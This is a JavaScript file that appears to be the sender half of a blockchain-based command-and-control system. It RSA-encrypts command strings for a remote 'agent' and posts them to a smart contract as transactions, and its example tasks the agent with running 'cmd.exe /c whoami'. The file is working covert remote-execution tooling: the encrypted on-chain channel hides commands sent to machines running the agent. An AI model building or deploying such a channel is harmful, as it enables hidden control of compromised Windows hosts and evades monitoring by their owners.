const Web3 = require('web3');
const MessagePortalABI = require('./MessagePortalABI.json');
const crypto = require('crypto');

// Blockchain configuration
const CONTRACT_ADDRESS = "";
const PROVIDER_URL = "";
const SERVER_PRIVATE_KEY = ""; // Replace with your private key

// RSA keys configuration
const RSA_AGENT_PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
-----END PUBLIC KEY-----`;

function encryptMessage(message) {
    try {
        const encrypted = crypto.publicEncrypt(
            {
                key: RSA_AGENT_PUBLIC_KEY,
                padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
                oaepHash: "sha256", // Specify the hash function used for OAEP
            },
            Buffer.from(message)
        );
        return encrypted.toString('base64');
    } catch (error) {
        console.error('Encryption error:', error);
        throw error;
    }
}

async function sendMessage(message1, message2, nonce) {
    try {
        const web3 = new Web3(PROVIDER_URL);
        const contract = new web3.eth.Contract(MessagePortalABI, CONTRACT_ADDRESS);

        // Encrypt messages
        const encryptedMessage1 = encryptMessage(message1);
        const encryptedMessage2 = encryptMessage(message2);

        // Create transaction
        const account = web3.eth.accounts.privateKeyToAccount(SERVER_PRIVATE_KEY);
        web3.eth.accounts.wallet.add(account);
        web3.eth.defaultAccount = account.address;

        // Estimate gas
        const gas = await contract.methods.message(nonce, encryptedMessage1, encryptedMessage2, 0)
            .estimateGas({ from: account.address });

        // Send transaction
        const result = await contract.methods.message(nonce, encryptedMessage1, encryptedMessage2, 0)
            .send({
                from: account.address,
                gas: Math.round(gas * 1.5) // Add 50% buffer for safety
            });

        console.log('Message sent successfully!');
        console.log('Transaction hash:', result.transactionHash);
        return result;

    } catch (error) {
        console.error('Error sending message:', error);
        throw error;
    }
}

// Example usage
async function main() {
    try {
        const nonce = Math.floor(Date.now() / 1000); // Use timestamp as nonce
        await sendMessage('C:\\windows\\system32\\cmd.exe', '/c "whoami"', nonce);
    } catch (error) {
        console.error('Main error:', error);
        process.exit(1);
    }
}

// Run the sender
if (require.main === module) {
    main();
}